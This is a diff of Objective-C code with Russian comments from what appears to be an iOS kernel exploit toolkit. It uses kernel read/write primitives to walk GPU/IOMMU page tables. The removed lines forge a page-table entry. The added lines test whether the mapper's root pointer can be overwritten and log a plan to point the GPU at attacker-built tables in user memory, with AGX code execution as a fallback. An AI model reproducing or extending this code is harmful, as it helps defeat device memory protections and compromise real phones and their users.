@@ -5358,32 +5358,27 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     GNOTE( [NSString stringWithFormat:@"  walk: e1=%#llx L2=%#llx e2=%#llx L3=%#llx", e1, L2, e2, L3]);
     if (!L3) { GNOTE( @"FAIL: таблица не достигнута"); gGartLive = NO; return r; }
 
-    // 4. живой эталон PTE + тип фрейма L3-страницы
-    uint64_t live = 0;
-    int liveIdx = -1;
-    for (int j = 0; j < 2048; j++) {
-        uint64_t e = kp_rc_kread64(L3 + (uint64_t)j * 8);
-        if (e) { live = e; liveIdx = j; break; }
-    }
+    // 4. типы фреймов ВСЕЙ цепочки: L3 (PTE-страница) оказалась 0x17 (IOMMU,
+    //    SPTM-защищена). Ищем ПЕРВОЕ heap-звено — root-указатель в mapper'е.
     uint64_t tableVA = [self frameTableVAWithLog:r];
-    int ft = kpVAType(L3, tableVA);
-    GNOTE( [NSString stringWithFormat:@"  L3 живой эталон [%d]=%#llx · frame type L3 = 0x%x %@", liveIdx, live, ft,
-               ft == 0x21 ? @"(heap RW — пишется)" : @"(НЕ heap — писать опасно!)"]);
+    int ftMapper = kpVAType(mapper, tableVA);
+    int ftL1arr = kpVAType(L1arr, tableVA);
+    int ftL2 = L2 ? kpVAType(L2, tableVA) : -1;
+    int ftL3 = L3 ? kpVAType(L3, tableVA) : -1;
+    GNOTE( [NSString stringWithFormat:@"  frame types: mapper=0x%x L1arr=0x%x L2=0x%x L3=0x%x (0x21=heap пишется, 0x17=IOMMU защищена)",
+               ftMapper, ftL1arr, ftL2, ftL3]);
 
-    // 5. форж: дублируем живую запись в пустой слот (той же таблицы), readback, restore
-    if (live && ft == 0x21) {
-        int emptySlot = -1;
-        for (int j = 200; j < 2048; j++) if (kp_rc_kread64(L3 + (uint64_t)j * 8) == 0) { emptySlot = j; break; }
-        if (emptySlot >= 0) {
-            uint64_t slotVA = L3 + (uint64_t)emptySlot * 8;
-            kp_rc_kwrite64(slotVA, live);
-            uint64_t rb = kp_rc_kread64(slotVA);
-            GNOTE( [NSString stringWithFormat:@"  PTE forge: slot=%d wrote=%#llx read=%#llx → %@",
-                       emptySlot, live, rb, rb == live ? @"ЗАПИСЬ ПРИЛИПЛА — GPU page tables пишутся с AP!" : @"не прилипла"]);
-            kp_rc_kwrite64(slotVA, 0);
-            GNOTE( [NSString stringWithFormat:@"  restore: %#llx", kp_rc_kread64(slotVA)]);
-        } else GNOTE( @"  пустого слота нет");
-    } else GNOTE( @"  skip forge: нет живого эталона или тип не RW");
+    // 5. если mapper — heap: тест записи root-указателя (no-op: то же значение)
+    if (ftMapper == 0x21) {
+        uint64_t orig = kp_rc_kread64(mapper + 0x30);
+        kp_rc_kwrite64(mapper + 0x30, orig);
+        uint64_t rb = kp_rc_kread64(mapper + 0x30);
+        GNOTE( [NSString stringWithFormat:@"  mapper root-ptr write test: %@ (rb=%#llx)",
+                   rb == orig ? @"ПИШЕТСЯ — можно подменить корень таблиц!" : @"не пишется", rb]);
+        GNOTE( @"  → путь: фейк-L1 в user-странице → mapper+0x30 = её phys → GPU ходит по нашим таблицам");
+    } else {
+        GNOTE( @"  mapper тоже защищён — путь через AGX code-exec (hibernation ctx ret)");
+    }
     gGartLive = NO;
     return r;
 }
